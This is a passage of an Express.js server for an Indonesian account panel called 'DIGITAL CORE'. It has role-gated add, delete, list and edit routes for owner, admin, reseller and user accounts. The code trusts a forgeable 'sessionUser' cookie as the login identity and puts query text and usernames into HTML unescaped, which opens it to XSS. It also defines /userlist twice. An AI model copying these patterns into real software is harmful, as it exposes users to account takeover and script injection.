        .role-admin { background: var(--neon-pink); color: #fff; }
        .role-reseller { background: var(--neon-cyan); color: #000; }
        .role-user { background: #555; color: #fff; }

        /* Input Styles */
        .form-group { margin-bottom: 15px; }

        label {
            display: block;
            margin-bottom: 6px;
            color: #555;
            font-size: 9px;
            font-family: 'Orbitron';
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        input, select {
            width: 100%;
            padding: 12px;
            background: #000;
            border: 1px solid #222;
            color: #fff;
            font-family: 'Rajdhani', sans-serif;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }

        input:focus, select:focus {
            border-color: var(--neon-cyan);
            box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);
        }

        /* Feedback Box */
        .permission-info {
            font-size: 10px;
            color: var(--neon-cyan);
            margin: 15px 0;
            padding: 8px;
            border: 1px dashed #222;
            text-align: center;
            font-family: 'Orbitron';
        }

        /* Buttons */
        .button-group {
            display: flex;
            gap: 10px;
        }

        .btn {
            flex: 1;
            padding: 14px;
            border: none;
            font-weight: 900;
            cursor: pointer;
            font-family: 'Orbitron';
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: 0.3s;
        }

        .btn-save {
            background: #fff;
            color: #000;
        }

        .btn-back {
            background: #000;
            color: #fff;
            border: 1px solid #333;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.1);
        }

        .footer-note {
            margin-top: 20px;
            font-size: 9px;
            color: #333;
            text-align: center;
            font-family: 'Orbitron';
        }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <header class="header">
            <h2>User Database</h2>
            <p>Authorized access only</p>
        </header>

        <main class="form-container">
            <section class="user-info">
                <div class="info-row">
                    <span class="info-label">Operator</span>
                    <span class="info-value">${username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Privilege</span>
                    <span class="info-value">
                        <span class="role-badge role-${role}">
                            ${role}
                        </span>
                    </span>
                </div>
            </section>

            <form method="POST" action="/adduser">
                <div class="form-group">
                    <label>Target ID</label>
                    <input type="text" name="username" placeholder="Username..." required autocomplete="off">
                </div>

                <div class="form-group">
                    <label>Access Key</label>
                    <input type="text" name="password" placeholder="Password..." required>
                </div>

                <div class="form-group">
                    <label>Assign Protocol</label>
                    <select id="role" name="role" required>
                        ${roleOptions}
                    </select>
                </div>

                <div class="form-group">
                    <label>Validity (Days)</label>
                    <input type="number" name="durasi" min="1" max="365" value="30" required>
                </div>

                <div class="permission-info">
                    <i class="fas fa-microchip"></i> 
                    ${role === 'reseller' ? 'SYNC: USER_LEVEL' : 
                      role === 'admin' ? 'SYNC: ADMIN_LEVEL' : 'SYNC: ALL_LEVEL'}
                </div>

                <div class="button-group">
                    <a href="/dashboard" class="btn btn-back">Exit</a>
                    <button type="submit" class="btn btn-save">Deploy User</button>
                </div>
            </form>

            <div class="footer-note">
                SECURE TRANSMISSION ACTIVE
            </div>
        </main>
    </div>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#111',
                lineColor: '#111',
                density: 10000,
                particleRadius: 2,
                proximity: 100
            });
        });
    </script>
</body>
</html>
  `;
  res.send(html);
});

app.post("/hapususer", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { username: targetUsername } = req.body;

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa hapus diri sendiri
  if (sessionUsername === targetUsername) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // 2. Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh hapus user biasa.");
  }

  // 3. Admin tidak boleh hapus admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa hapus admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa hapus owner.");
    }
  }

  // 4. Owner bisa hapus semua kecuali diri sendiri

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== targetUsername);
  saveUsers(filtered);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + targetUsername + " berhasil dihapus");
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  // Tombol Tambah User Baru
  const addUserButton = `
    <div style="text-align: center; margin: 20px 0;">
      <a href="/adduser" class="btn-add-user">
        <i class="fas fa-user-plus"></i> TAMBAH USER BARU
      </a>
    </div>
  `;

  const html = `
   <!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
      /* Background gradasi khas iOS */
      background: radial-gradient(circle at top right, #2c3e50, #000000);
      color: #FFFFFF;
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
      -webkit-font-smoothing: antialiased;
    }

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1000px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #FFFFFF;
      font-size: 32px;
      font-weight: 700;
      letter-spacing: -0.5px;
      margin-bottom: 8px;
    }

    .header p {
      color: rgba(255, 255, 255, 0.6);
      font-size: 15px;
      font-weight: 400;
    }

    /* Tombol ala Apple Pay / iOS Button */
    .btn-add-user {
      display: inline-block;
      padding: 12px 24px;
      background: #FFFFFF;
      color: #000000;
      text-decoration: none;
      border-radius: 12px;
      font-weight: 600;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      border: none;
      cursor: pointer;
      font-size: 15px;
      margin-bottom: 20px;
    }

    .btn-add-user:active {
      transform: scale(0.96);
      background: rgba(255, 255, 255, 0.9);
    }

    /* Glassmorphism Container */
    .table-container {
      overflow-x: auto;
      border-radius: 20px;
      border: 1px solid rgba(255, 255, 255, 0.15);
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      margin-bottom: 25px;
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }

    th,
    td {
      padding: 18px 16px;
      text-align: left;
      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    }

    th {
      background: rgba(255, 255, 255, 0.05);
      color: rgba(255, 255, 255, 0.5);
      font-weight: 600;
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    td {
      color: #FFFFFF;
      font-size: 15px;
    }

    tr:last-child td {
      border-bottom: none;
    }

    tr:hover td {
      background: rgba(255, 255, 255, 0.05);
    }

    /* Badge minimalis ala iOS */
    .role-badge {
      display: inline-block;
      padding: 4px 10px;
      border-radius: 8px;
      font-size: 12px;
      font-weight: 600;
    }

    .role-owner { background: #FFD60A; color: #000; }
    .role-admin { background: #FF3B30; color: #fff; }
    .role-reseller { background: #32D74B; color: #000; }
    .role-user { background: #0A84FF; color: #fff; }

    .btn-edit {
      display: inline-block;
      padding: 6px 14px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      color: #FFFFFF;
      text-decoration: none;
      font-size: 13px;
      font-weight: 500;
      transition: background 0.2s;
    }

    .btn-edit:hover {
      background: rgba(255, 255, 255, 0.2);
    }

    .close-btn {
      display: block;
      width: fit-content;
      min-width: 160px;
      padding: 14px 30px;
      margin: 30px auto;
      background: rgba(255, 255, 255, 0.1);
      color: #FFFFFF;
      text-align: center;
      border-radius: 14px;
      text-decoration: none;
      font-size: 15px;
      font-weight: 600;
      border: 1px solid rgba(255, 255, 255, 0.1);
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .close-btn:active {
      transform: scale(0.97);
      background: rgba(255, 255, 255, 0.15);
    }

    /* Stats Bar Glass */
    .stats-bar {
      display: flex;
      justify-content: space-around;
      margin-bottom: 25px;
      padding: 20px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(15px);
      border-radius: 18px;
    }

    .stat-item {
      text-align: center;
    }

    .stat-value {
      font-size: 20px;
      font-weight: 700;
      color: #FFFFFF;
      display: block;
    }

    .stat-label {
      font-size: 12px;
      color: rgba(255, 255, 255, 0.5);
      text-transform: uppercase;
      font-weight: 500;
    }

    /* Media Queries */
    @media (max-width: 768px) {
      .header h2 { font-size: 26px; }
      .stats-bar {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 15px;
      }
    }

    /* Scrollbar minimalis (Safari style) */
    .table-container::-webkit-scrollbar {
      height: 4px;
      width: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(255, 255, 255, 0.2);
      border-radius: 10px;
    }
  </style>
</head>

<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>Daftar semua user yang terdaftar dalam sistem</p>
    </div>

    ${messageHtml}

    ${addUserButton}

    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>

</html>
  `;
  res.send(html);
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #F0F0F0;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #F0F0F0;
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
    }

    .header p {
      color: #A0A0A0;
      font-size: 14px;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 12px;
      border: 1px solid #333333;
      background: rgba(26, 26, 26, 0.8);
      backdrop-filter: blur(10px);
      font-size: 14px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }
    
    th, td {
      padding: 15px 12px;
      text-align: left;
      border-bottom: 1px solid #333333;
      white-space: nowrap;
    }

    th {
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
    }

    td {
      background: rgba(38, 38, 38, 0.7);
      color: #E0E0E0;
      font-size: 13px;
    }

    tr:hover td {
      background: rgba(60, 60, 60, 0.8);
      transition: background 0.3s ease;
    }

    .role-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .role-owner {
      background: linear-gradient(135deg, #FFD700, #FFA500);
      color: #000;
    }

    .role-admin {
      background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
      color: #fff;
    }

    .role-reseller {
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
    }

    .role-user {
      background: linear-gradient(135deg, #95E1D3, #B5EAD7);
      color: #000;
    }

    .btn-edit {
      display: inline-block;
      padding: 6px 12px;
      background: rgba(78, 205, 196, 0.2);
      border: 1px solid rgba(78, 205, 196, 0.5);
      border-radius: 6px;
      color: #4ECDC4;
      text-decoration: none;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .btn-edit:hover {
      background: rgba(78, 205, 196, 0.3);
      transform: translateY(-2px);
    }

    .close-btn {
      display: block;
      width: 200px;
      padding: 14px;
      margin: 30px auto;
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      text-align: center;
      border-radius: 8px;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid #333333;
      cursor: pointer;
      transition: all 0.3s ease;
      box-sizing: border-box;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .close-btn:hover {
      background: rgba(240, 240, 240, 0.1);
      border-color: #F0F0F0;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(240, 240, 240, 0.2);
    }

    .stats-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(26, 26, 26, 0.8);
      border: 1px solid #333333;
      border-radius: 8px;
      font-size: 13px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-size: 18px;
      font-weight: bold;
      color: #F0F0F0;
      font-family: 'Orbitron', sans-serif;
    }

    .stat-label {
      font-size: 11px;
      color: #A0A0A0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    @media (max-width: 768px) {
      .header h2 { 
        font-size: 22px; 
      }
      
      table { 
        font-size: 12px; 
      }
      
      th, td { 
        padding: 10px 8px; 
      }
      
      .stats-bar {
        flex-direction: column;
        gap: 10px;
      }
      
      .stat-item {
        text-align: left;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }
      
      .header {
        padding: 10px;
      }
      
      .header h2 { 
        font-size: 18px; 
      }
    }

    /* Animasi untuk tabel */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .table-container {
      animation: fadeIn 0.6s ease-out;
    }

    /* Scrollbar styling */
    .table-container::-webkit-scrollbar {
      height: 8px;
    }

    .table-container::-webkit-scrollbar-track {
      background: rgba(51, 51, 51, 0.5);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(240, 240, 240, 0.3);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 240, 240, 0.5);
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>Daftar semua user yang terdaftar dalam sistem</p>
    </div>

    <!-- Notifikasi Pesan -->
    ${messageHtml}

    <!-- Stats Bar -->
    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const currentUsername = username;
  const targetUsername = req.query.username;

  // Jika tidak ada parameter username, tampilkan form kosong atau redirect
  if (!targetUsername || targetUsername === 'undefined' || targetUsername === 'null') {
    const errorHtml = `
    <!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    body { 
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
      /* Background gradasi gelap khas wallpaper iPhone */
      background: radial-gradient(circle at top right, #2c3e50, #000000); 
      color: #fff; 
      text-align: center; 
      padding: 50px 20px; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      -webkit-font-smoothing: antialiased;
    }

    .error { 
      /* Efek Glassmorphism */
      background: rgba(255, 255, 255, 0.08); 
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      padding: 40px 30px; 
      border-radius: 24px; 
      border: 1px solid rgba(255, 255, 255, 0.15);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 400px;
      width: 100%;
    }

    h2 {
      font-weight: 600;
      margin-bottom: 20px;
      letter-spacing: -0.5px;
    }

    p {
      color: rgba(255, 255, 255, 0.8);
      line-height: 1.6;
      font-size: 15px;
    }

    small {
      display: block;
      margin-top: 15px;
      color: rgba(255, 255, 255, 0.4);
    }

    /* Tombol ala iOS Button */
    .btn {
      display: inline-block;
      padding: 14px 28px;
      background: #FFFFFF; /* Putih solid agar kontras */
      color: #000;
      text-decoration: none;
      border-radius: 14px;
      margin-top: 25px;
      font-weight: 600;
      font-size: 15px;
      transition: all 0.2s ease;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }

    .btn:active {
      transform: scale(0.96);
      background: rgba(255, 255, 255, 0.9);
    }

    .btn i {
      margin-right: 8px;
    }

    a[style*="color: #4ECDC4"] {
      color: #0A84FF !important; /* Warna biru khas iOS */
      text-decoration: none;
      font-weight: 600;
    }

    a[style*="color: #4ECDC4"]:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="error">
    <h2>📝 Edit User</h2>
    <p>Silakan pilih user yang ingin diedit dari <a href="/userlist" style="color: #4ECDC4;">User List</a></p>
    <p><small>Parameter username tidak ditemukan</small></p>
    <a href="/userlist" class="btn">
      <i class="fas fa-arrow-left"></i> Kembali ke User List
    </a>
  </div>
</body>
</html>
    `;
    return res.send(errorHtml);
  }

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error - User Not Found</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    body { 
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
      /* Gradasi gelap khas iOS */
      background: radial-gradient(circle at top right, #2c3e50, #000000); 
      color: #fff; 
      text-align: center; 
      padding: 20px; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      -webkit-font-smoothing: antialiased;
    }

    .error { 
      /* Glassmorphism Effect */
      background: rgba(255, 255, 255, 0.08); 
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      padding: 40px 30px; 
      border-radius: 28px; 
      border: 1px solid rgba(255, 255, 255, 0.15);
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
      max-width: 420px;
      width: 100%;
    }

    .icon-error {
      font-size: 50px;
      color: #FF3B30; /* Warna merah khas iOS */
      margin-bottom: 20px;
    }

    h2 {
      font-weight: 600;
      font-size: 22px;
      margin-bottom: 15px;
      letter-spacing: -0.5px;
    }

    p {
      color: rgba(255, 255, 255, 0.7);
      line-height: 1.5;
      font-size: 15px;
      margin-bottom: 10px;
    }

    strong {
      color: #FFFFFF;
      background: rgba(255, 255, 255, 0.1);
      padding: 2px 6px;
      border-radius: 4px;
      font-weight: 600;
    }

    /* Link & Button Style */
    .btn-back {
      display: inline-block;
      margin-top: 25px;
      padding: 14px 30px;
      background: #FFFFFF;
      color: #000000;
      text-decoration: none;
      border-radius: 15px;
      font-weight: 600;
      font-size: 15px;
      transition: all 0.2s ease;
    }

    .btn-back:active {
      transform: scale(0.96);
      background: rgba(255, 255, 255, 0.9);
    }

    .link-list {
      color: #0A84FF; /* Biru iOS */
      text-decoration: none;
      font-weight: 600;
    }
  </style>
</head>
<body>

  <div class="error">
    <div class="icon-error">
      <i class="fas fa-exclamation-circle"></i>
    </div>
    <h2>❌ ERROR: User tidak ditemukan</h2>
    <p>User dengan username <strong>"${targetUsername}"</strong> tidak ditemukan dalam database.</p>
    <p>Silakan kembali ke <a href="/userlist" class="link-list">User List</a></p>
    
    <a href="/userlist" class="btn-back">
      <i class="fas fa-chevron-left"></i> Kembali Sekarang
    </a>
  </div>

</body>
</html>
    `;
    return res.send(errorHtml);
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (targetUsername === currentUsername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (role === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (role === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
